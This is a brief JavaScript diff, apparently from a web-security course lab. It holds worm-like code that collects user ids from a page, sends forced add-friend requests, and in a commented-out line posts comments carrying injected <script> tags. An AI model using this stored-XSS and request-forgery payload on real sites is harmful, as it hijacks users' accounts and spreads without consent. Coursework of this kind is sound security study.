@@ -19,7 +19,7 @@ function moveitmoveit() {
     alert(eff);
     var arr= eff.match('^[^<br]*').join().split(',');
     for( var i = 0; i < arr.length; i++){
-        //$.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{id: arr[i],comment: 'Bing Bong<script src=''></script>'});
+        //$.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{id: arr[i],comment: 'Bing Bong<script src=""></script>'});
     }
     if(eff.match('134') == null){
         $.get("http://csec380-core.csec.rit.edu:86/add_friend.php",{id: 134});
